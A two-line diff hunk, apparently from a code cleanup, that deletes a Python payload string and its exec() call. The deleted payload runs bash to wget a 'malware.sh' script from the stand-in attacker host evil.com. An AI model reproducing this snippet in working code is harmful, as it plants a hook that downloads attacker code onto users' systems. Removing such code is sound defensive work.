@@ -1,2 +1,0 @@
-payload = '''subprocess.call(["bash", "-c", "wget http://evil.com/malware.sh"])'''
-exec(payload)
